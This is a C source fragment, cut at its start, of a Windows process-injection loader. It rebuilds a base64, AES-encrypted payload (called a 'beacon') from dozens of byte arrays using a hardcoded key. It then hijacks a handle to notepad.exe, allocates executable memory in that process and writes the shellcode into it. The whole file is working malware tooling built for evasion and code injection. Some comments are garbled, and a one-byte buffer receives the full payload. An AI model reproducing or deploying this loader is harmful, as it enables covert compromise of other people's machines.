const char sc_8[16] = { 0x58,0x44,0x4e,0x36,0x47,0x62,0x51,0x6b,0x45,0x74,0x32,0x73,0x2b,0x70,0x57,0x77 };
char sc_9[16] = { 0x45,0x4f,0x34,0x78,0x32,0x62,0x36,0x6c,0x4c,0x32,0x43,0x59,0x6b,0x55,0x7a,0x57 };
const char sc_10[16] = { 0x69,0x51,0x54,0x58,0x31,0x4c,0x76,0x53,0x69,0x54,0x43,0x47,0x54,0x77,0x35,0x70 };
char sc_11[16] = { 0x32,0x74,0x49,0x42,0x4e,0x6d,0x6b,0x78,0x46,0x55,0x6e,0x4e,0x71,0x34,0x76,0x44 };
const char sc_12[16] = { 0x5a,0x4f,0x57,0x62,0x44,0x33,0x59,0x35,0x59,0x44,0x4b,0x76,0x35,0x58,0x48,0x50 };
char sc_13[16] = { 0x39,0x77,0x65,0x35,0x59,0x36,0x34,0x2f,0x35,0x35,0x4a,0x57,0x7a,0x75,0x6b,0x2f };
const char sc_14[16] = { 0x45,0x58,0x58,0x4e,0x75,0x6b,0x39,0x62,0x4f,0x55,0x55,0x45,0x57,0x72,0x44,0x33 };
char sc_15[16] = { 0x2f,0x67,0x64,0x4f,0x54,0x4d,0x5a,0x56,0x79,0x4c,0x2f,0x66,0x33,0x45,0x4d,0x43 };
const char sc_16[16] = { 0x48,0x48,0x76,0x56,0x55,0x39,0x4d,0x31,0x70,0x55,0x6a,0x4b,0x44,0x79,0x67,0x42 };
char sc_17[16] = { 0x6c,0x63,0x35,0x7a,0x47,0x4c,0x41,0x68,0x64,0x41,0x44,0x37,0x56,0x46,0x66,0x64 };
const char sc_18[16] = { 0x45,0x65,0x4b,0x31,0x6b,0x38,0x45,0x5a,0x46,0x79,0x56,0x76,0x32,0x76,0x47,0x6c };
char sc_19[16] = { 0x2b,0x50,0x4d,0x79,0x49,0x6e,0x66,0x54,0x43,0x44,0x54,0x4f,0x47,0x48,0x7a,0x67 };
const char sc_20[16] = { 0x45,0x74,0x67,0x71,0x55,0x65,0x58,0x57,0x51,0x78,0x4f,0x48,0x65,0x4d,0x57,0x50 };
char sc_21[16] = { 0x6b,0x43,0x7a,0x75,0x65,0x42,0x58,0x31,0x72,0x67,0x70,0x71,0x36,0x74,0x63,0x38 };
const char sc_22[16] = { 0x7a,0x70,0x6a,0x74,0x47,0x57,0x75,0x69,0x52,0x6d,0x78,0x59,0x4d,0x38,0x4f,0x66 };
char sc_23[16] = { 0x69,0x75,0x59,0x68,0x54,0x46,0x34,0x68,0x71,0x67,0x76,0x38,0x30,0x54,0x4e,0x6c };
const char sc_24[16] = { 0x57,0x4f,0x4f,0x6d,0x66,0x65,0x4e,0x57,0x6f,0x79,0x55,0x55,0x75,0x68,0x47,0x59 };
char sc_25[16] = { 0x4f,0x4a,0x37,0x64,0x39,0x6a,0x66,0x46,0x31,0x6f,0x4b,0x2f,0x6e,0x61,0x6b,0x51 };
const char sc_26[16] = { 0x72,0x56,0x30,0x48,0x66,0x6a,0x35,0x4d,0x75,0x6e,0x6a,0x46,0x35,0x74,0x56,0x56 };
char sc_27[16] = { 0x4e,0x45,0x75,0x72,0x30,0x74,0x35,0x53,0x73,0x46,0x32,0x67,0x75,0x4d,0x58,0x2f };
const char sc_28[16] = { 0x4e,0x56,0x54,0x35,0x43,0x51,0x75,0x76,0x58,0x2f,0x55,0x31,0x51,0x39,0x76,0x49 };
char sc_29[16] = { 0x33,0x2b,0x61,0x44,0x45,0x63,0x6b,0x62,0x6a,0x42,0x66,0x4d,0x33,0x2f,0x65,0x50 };
const char sc_30[16] = { 0x35,0x79,0x65,0x4b,0x78,0x5a,0x58,0x65,0x34,0x7a,0x6b,0x56,0x34,0x52,0x39,0x46 };
char sc_31[16] = { 0x72,0x59,0x7a,0x36,0x52,0x4a,0x4b,0x45,0x6c,0x55,0x69,0x33,0x33,0x4f,0x46,0x63 };
const char sc_32[16] = { 0x59,0x74,0x57,0x63,0x6f,0x36,0x48,0x78,0x77,0x74,0x51,0x61,0x74,0x30,0x42,0x48 };
char sc_33[16] = { 0x6a,0x68,0x63,0x34,0x30,0x54,0x38,0x31,0x6d,0x62,0x47,0x53,0x76,0x67,0x76,0x35 };
const char sc_34[16] = { 0x62,0x77,0x47,0x71,0x53,0x33,0x6a,0x76,0x43,0x71,0x38,0x65,0x64,0x69,0x79,0x63 };
char sc_35[16] = { 0x53,0x67,0x6a,0x49,0x50,0x74,0x71,0x46,0x41,0x33,0x52,0x64,0x35,0x50,0x64,0x38 };
const char sc_36[16] = { 0x72,0x78,0x69,0x47,0x57,0x6f,0x6b,0x36,0x66,0x50,0x4f,0x51,0x48,0x46,0x79,0x65 };
char sc_37[16] = { 0x50,0x49,0x63,0x61,0x6f,0x2b,0x34,0x53,0x34,0x46,0x63,0x5a,0x2f,0x4d,0x62,0x42 };
const char sc_38[16] = { 0x71,0x64,0x44,0x64,0x2b,0x34,0x67,0x53,0x6f,0x35,0x57,0x76,0x43,0x39,0x70,0x36 };
char sc_39[16] = { 0x66,0x4c,0x34,0x32,0x42,0x4c,0x68,0x6d,0x70,0x30,0x38,0x54,0x64,0x6a,0x46,0x76 };
const char sc_40[16] = { 0x45,0x30,0x6c,0x52,0x41,0x45,0x70,0x53,0x6e,0x78,0x48,0x31,0x32,0x7a,0x38,0x55 };
char sc_41[16] = { 0x41,0x46,0x62,0x6e,0x6a,0x36,0x31,0x59,0x73,0x65,0x55,0x39,0x59,0x5a,0x70,0x4b };
const char sc_42[16] = { 0x4d,0x76,0x67,0x48,0x59,0x34,0x6f,0x68,0x68,0x70,0x67,0x4f,0x36,0x4b,0x7a,0x4d };
char sc_43[16] = { 0x54,0x75,0x6f,0x6d,0x34,0x64,0x72,0x6f,0x7a,0x64,0x6a,0x36,0x5a,0x59,0x45,0x45 };
const char sc_44[16] = { 0x72,0x55,0x4a,0x46,0x6e,0x41,0x6f,0x5a,0x6d,0x45,0x46,0x38,0x6c,0x57,0x58,0x41 };
char sc_45[16] = { 0x56,0x45,0x74,0x42,0x61,0x70,0x36,0x5a,0x78,0x34,0x78,0x79,0x4a,0x52,0x69,0x61 };
const char sc_46[16] = { 0x4b,0x52,0x72,0x64,0x76,0x41,0x6c,0x6a,0x34,0x78,0x72,0x49,0x68,0x32,0x74,0x6c };
char sc_47[16] = { 0x37,0x64,0x44,0x74,0x61,0x6d,0x64,0x7a,0x2b,0x31,0x6d,0x6a,0x6a,0x49,0x47,0x6c };
const char sc_48[16] = { 0x75,0x73,0x35,0x69,0x45,0x71,0x65,0x63,0x76,0x39,0x56,0x43,0x53,0x41,0x6e,0x44 };
char sc_49[16] = { 0x41,0x2f,0x49,0x54,0x57,0x33,0x59,0x48,0x63,0x64,0x61,0x47,0x63,0x65,0x63,0x77 };
const char sc_50[16] = { 0x6c,0x61,0x43,0x4f,0x78,0x49,0x73,0x58,0x70,0x67,0x49,0x33,0x75,0x79,0x50,0x6e };
char sc_51[16] = { 0x6a,0x68,0x33,0x76,0x58,0x6b,0x57,0x57,0x30,0x67,0x65,0x56,0x50,0x57,0x69,0x33 };
const char sc_52[16] = { 0x57,0x63,0x4d,0x67,0x54,0x47,0x56,0x65,0x56,0x4b,0x37,0x76,0x2f,0x4e,0x71,0x75 };
char sc_53[16] = { 0x35,0x38,0x67,0x70,0x32,0x2b,0x58,0x72,0x32,0x74,0x4d,0x36,0x77,0x65,0x7a,0x46 };
const char sc_54[16] = { 0x62,0x77,0x62,0x74,0x32,0x57,0x48,0x44,0x46,0x48,0x74,0x6d,0x7a,0x4a,0x45,0x78 };
char sc_55[16] = { 0x46,0x34,0x38,0x46,0x6f,0x58,0x52,0x41,0x64,0x6d,0x30,0x47,0x30,0x4d,0x6b,0x44 };
const char sc_56[16] = { 0x73,0x6f,0x6d,0x52,0x79,0x76,0x56,0x78,0x71,0x34,0x32,0x4d,0x61,0x71,0x30,0x46 };
char sc_57[16] = { 0x37,0x67,0x71,0x2b,0x45,0x69,0x51,0x33,0x76,0x32,0x34,0x4c,0x6e,0x6e,0x2f,0x6c };
const char sc_58[16] = { 0x2b,0x51,0x6a,0x69,0x4c,0x6b,0x4f,0x43,0x2b,0x68,0x42,0x75,0x76,0x6e,0x75,0x2b };
char sc_59[16] = { 0x41,0x6f,0x41,0x73,0x48,0x6a,0x57,0x53,0x4b,0x67,0x42,0x76,0x71,0x38,0x2f,0x57 };
const char sc_60[16] = { 0x70,0x4c,0x64,0x56,0x4f,0x65,0x77,0x31,0x79,0x39,0x45,0x74,0x6e,0x62,0x79,0x79 };
char sc_61[16] = { 0x4d,0x4a,0x49,0x61,0x43,0x71,0x54,0x4a,0x4f,0x66,0x41,0x6d,0x6b,0x4b,0x78,0x79 };
const char sc_62[16] = { 0x70,0x33,0x31,0x70,0x36,0x44,0x73,0x5a,0x74,0x64,0x6b,0x73,0x6a,0x59,0x6f,0x2b };
char sc_63[16] = { 0x74,0x44,0x67,0x53,0x55,0x6d,0x42,0x68,0x72,0x6e,0x34,0x73,0x31,0x42,0x57,0x4a };
const char sc_64[16] = { 0x4d,0x39,0x44,0x6b,0x71,0x52,0x68,0x36,0x75,0x53,0x6c,0x7a,0x49,0x76,0x70,0x67 };
char sc_65[16] = { 0x61,0x37,0x57,0x39,0x54,0x34,0x78,0x53,0x53,0x36,0x6b,0x4d,0x48,0x48,0x75,0x4d };
const char sc_66[16] = { 0x56,0x57,0x4b,0x4b,0x30,0x2b,0x72,0x55,0x52,0x4a,0x65,0x5a,0x6b,0x71,0x5a,0x64 };
char sc_67[16] = { 0x63,0x66,0x67,0x4d,0x51,0x74,0x44,0x32,0x69,0x47,0x56,0x42,0x52,0x56,0x72,0x4c };
const char sc_68[16] = { 0x48,0x65,0x5a,0x37,0x42,0x44,0x2b,0x47,0x5a,0x30,0x6a,0x2b,0x77,0x71,0x46,0x4c };
char sc_69[16] = { 0x4a,0x69,0x59,0x6f,0x6b,0x78,0x46,0x5a,0x4f,0x61,0x77,0x4d,0x4b,0x31,0x36,0x53 };
const char sc_70[16] = { 0x75,0x63,0x72,0x63,0x6d,0x62,0x6d,0x48,0x4b,0x58,0x41,0x35,0x6d,0x46,0x35,0x45 };
char sc_71[16] = { 0x66,0x57,0x72,0x37,0x72,0x59,0x30,0x59,0x4e,0x4c,0x4d,0x6a,0x74,0x2f,0x61,0x35 };
const char sc_72[16] = { 0x64,0x31,0x6e,0x70,0x36,0x48,0x34,0x65,0x72,0x70,0x6b,0x5a,0x68,0x71,0x79,0x39 };
char sc_73[16] = { 0x76,0x79,0x65,0x68,0x53,0x73,0x63,0x37,0x58,0x6c,0x56,0x6b,0x42,0x74,0x34,0x49 };
const char sc_74[16] = { 0x43,0x64,0x69,0x49,0x7a,0x5a,0x36,0x38,0x36,0x7a,0x4e,0x35,0x48,0x35,0x53,0x35 };
char sc_75[16] = { 0x65,0x45,0x2b,0x70,0x4f,0x2b,0x37,0x7a,0x68,0x44,0x50,0x72,0x7a,0x53,0x69,0x79 };
const char sc_76[16] = { 0x2f,0x5a,0x58,0x75,0x6c,0x30,0x5a,0x2b,0x77,0x63,0x36,0x47,0x69,0x58,0x47,0x56 };
char sc_77[16] = { 0x79,0x7a,0x6a,0x55,0x6b,0x66,0x77,0x56,0x54,0x6c,0x49,0x6a,0x50,0x51,0x79,0x43 };
const char sc_78[16] = { 0x61,0x76,0x33,0x4d,0x7a,0x70,0x56,0x30,0x67,0x53,0x75,0x5a,0x4c,0x2b,0x35,0x73 };
char sc_79[16] = { 0x73,0x65,0x4b,0x4f,0x6f,0x72,0x74,0x6d,0x30,0x65,0x68,0x31,0x54,0x66,0x64,0x45 };

char sc[1280];
int sc_length = 1280;
void buildsc_0() {
    memcpy(&sc[0], sc_0, 16);
    memcpy(&sc[16], sc_1, 16);
    memcpy(&sc[32], sc_2, 16);
    memcpy(&sc[48], sc_3, 16);
    memcpy(&sc[64], sc_4, 16);
    memcpy(&sc[80], sc_5, 16);
    memcpy(&sc[96], sc_6, 16);
    memcpy(&sc[112], sc_7, 16);
    memcpy(&sc[128], sc_8, 16);
    memcpy(&sc[144], sc_9, 16);
    memcpy(&sc[160], sc_10, 16);
    memcpy(&sc[176], sc_11, 16);
    memcpy(&sc[192], sc_12, 16);
    memcpy(&sc[208], sc_13, 16);
    memcpy(&sc[224], sc_14, 16);
    memcpy(&sc[240], sc_15, 16);
    memcpy(&sc[256], sc_16, 16);
    memcpy(&sc[272], sc_17, 16);
    memcpy(&sc[288], sc_18, 16);
    memcpy(&sc[304], sc_19, 16);
    memcpy(&sc[320], sc_20, 16);
    memcpy(&sc[336], sc_21, 16);
    memcpy(&sc[352], sc_22, 16);
    memcpy(&sc[368], sc_23, 16);
    memcpy(&sc[384], sc_24, 16);
    memcpy(&sc[400], sc_25, 16);
    memcpy(&sc[416], sc_26, 16);
    memcpy(&sc[432], sc_27, 16);
    memcpy(&sc[448], sc_28, 16);
    memcpy(&sc[464], sc_29, 16);
    memcpy(&sc[480], sc_30, 16);
    memcpy(&sc[496], sc_31, 16);
    memcpy(&sc[512], sc_32, 16);
    memcpy(&sc[528], sc_33, 16);
    memcpy(&sc[544], sc_34, 16);
    memcpy(&sc[560], sc_35, 16);
    memcpy(&sc[576], sc_36, 16);
    memcpy(&sc[592], sc_37, 16);
    memcpy(&sc[608], sc_38, 16);
    memcpy(&sc[624], sc_39, 16);
    memcpy(&sc[640], sc_40, 16);
    memcpy(&sc[656], sc_41, 16);
    memcpy(&sc[672], sc_42, 16);
    memcpy(&sc[688], sc_43, 16);
    memcpy(&sc[704], sc_44, 16);
    memcpy(&sc[720], sc_45, 16);
    memcpy(&sc[736], sc_46, 16);
    memcpy(&sc[752], sc_47, 16);
    memcpy(&sc[768], sc_48, 16);
    memcpy(&sc[784], sc_49, 16);
    memcpy(&sc[800], sc_50, 16);
    memcpy(&sc[816], sc_51, 16);
    memcpy(&sc[832], sc_52, 16);
    memcpy(&sc[848], sc_53, 16);
    memcpy(&sc[864], sc_54, 16);
    memcpy(&sc[880], sc_55, 16);
    memcpy(&sc[896], sc_56, 16);
    memcpy(&sc[912], sc_57, 16);
    memcpy(&sc[928], sc_58, 16);
    memcpy(&sc[944], sc_59, 16);
    memcpy(&sc[960], sc_60, 16);
    memcpy(&sc[976], sc_61, 16);
    memcpy(&sc[992], sc_62, 16);
    memcpy(&sc[1008], sc_63, 16);
    memcpy(&sc[1024], sc_64, 16);
    memcpy(&sc[1040], sc_65, 16);
    memcpy(&sc[1056], sc_66, 16);
    memcpy(&sc[1072], sc_67, 16);
    memcpy(&sc[1088], sc_68, 16);
    memcpy(&sc[1104], sc_69, 16);
    memcpy(&sc[1120], sc_70, 16);
    memcpy(&sc[1136], sc_71, 16);
    memcpy(&sc[1152], sc_72, 16);
    memcpy(&sc[1168], sc_73, 16);
    memcpy(&sc[1184], sc_74, 16);
    memcpy(&sc[1200], sc_75, 16);
    memcpy(&sc[1216], sc_76, 16);
    memcpy(&sc[1232], sc_77, 16);
    memcpy(&sc[1248], sc_78, 16);
    memcpy(&sc[1264], sc_79, 16);
}
void buildsc() {
    buildsc_0();
}
BYTE key[] = "lbUVDReoDqEQIrRFimGqzpvXybcnBaqW";


//==================================================================================================


HANDLE m_p_hTargetPid = NULL;
const wchar_t* processName = L"notepad.exe";
PVOID m_ShellcodeAddress = NULL;
unsigned char m_cShellcode[] = {0};
int m_szShellcodeSize;


DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry;
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(snapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, processName) == 0) {
                    pid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(snapshot, &processEntry));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

BYTE* NtQueryObject_(HANDLE x, OBJECT_INFORMATION_CLASS y) {
    _NtQueryObject NtQueryObject = (_NtQueryObject)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryObject"));
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;
    BYTE* Information = NULL;

    do {
        Information = (BYTE*)realloc(Information, InformationLength);
        Ntstatus = NtQueryObject(x, y, Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);

    return Information;
}

HANDLE HijackProcessHandle(PWSTR wsObjectType, HANDLE p_hTarget, DWORD dwDesiredAccess) {
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess"));

    BYTE* Information = NULL;
    ULONG InformationLength = 0;
    NTSTATUS Ntstatus = STATUS_INFO_LENGTH_MISMATCH;

    do {
        Information = (BYTE*)realloc(Information, InformationLength);
        Ntstatus = NtQueryInformationProcess(p_hTarget, (PROCESSINFOCLASS)(ProcessHandleInformation), Information, InformationLength, &InformationLength);
    } while (STATUS_INFO_LENGTH_MISMATCH == Ntstatus);


    PPROCESS_HANDLE_SNAPSHOT_INFORMATION pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)(Information);

    HANDLE p_hDuplicatedObject;
    ULONG InformationLength_ = 0;

    for (int i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
        DuplicateHandle(
            p_hTarget,
            pProcessHandleInformation->Handles[i].HandleValue,
            GetCurrentProcess(),
            &p_hDuplicatedObject,
            dwDesiredAccess,
            FALSE,
            (DWORD_PTR)NULL);

        BYTE* pObjectInformation;
        pObjectInformation = NtQueryObject_(p_hDuplicatedObject, ObjectTypeInformation);
        PPUBLIC_OBJECT_TYPE_INFORMATION pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)(pObjectInformation);

        if (wcscmp(wsObjectType, pObjectTypeInformation->TypeName.Buffer) != 0) {
            continue;
        }

        return p_hDuplicatedObject;
    }
}

LPVOID AllocateShellcodeMemory() {

    buildsc();

    size_t szOutput = 0;
    DWORD size = 0;
    unsigned char* file_enc = NULL;
    BYTE* beaconContent = NULL;
    size_t beaconSize = NULL;
    file_enc = base64_decode(sc, sc_length, &szOutput);  //�ȶ�shellcode base64����

    for (int i = 0; i < sc_length; i++) {
        //printf("0x%x,", file_enc[i]);
    }
    //printf("\nbase64 ok\n");

    if (szOutput == 0) {
        DEBUG("[x] Base64 decode failed \n");
        return -1;
    }


    //ʹ��key��AES����
    beaconSize = szOutput - 16;
    beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE));
    BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent);
    if (!decryptStatus || beaconContent == NULL) {
        DEBUG("[x] AES decryption failed\n");
        return -1;
    }
    for (int i = 0; i < beaconSize; i++) {
        m_cShellcode[i] = beaconContent[i];
        //printf("0x%x,", beaconContent[i]);
    }
    //printf("\n");

    //m_cShellcode = *beaconContent;
    m_szShellcodeSize = beaconSize;

    LPVOID ShellcodeAddress = VirtualAllocEx(m_p_hTargetPid, NULL, m_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (ShellcodeAddress == NULL) {
        //printf("AllocateShellcodeMemory Something went wrong\n");
        return -1;
    }
    //printf("Allocated shellcode memory in the target process: %p\n", ShellcodeAddress);
    return ShellcodeAddress;
}

HANDLE GetTargetProcessHandle() {
    
    DWORD m_dwTargetPid = GetProcessIdByName(processName);  //�õ�PID
    HANDLE p_hTargetPid = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION, FALSE, m_dwTargetPid);
    if (p_hTargetPid == NULL) {
        return NULL;
    }
    else {
        //printf("Retrieved handle to the target process : %p\n",p_hTargetPid);
        return p_hTargetPid;
    }
}

BOOL WriteShellcode() {
    BOOL res = WriteProcessMemory(m_p_hTargetPid, m_ShellcodeAddress, m_cShellcode, m_szShellcodeSize, NULL);
    if (res == 0) {
        return FALSE;
    }
    else {
        //printf("Written shellcode to the target process\n");
        return TRUE;
    }
}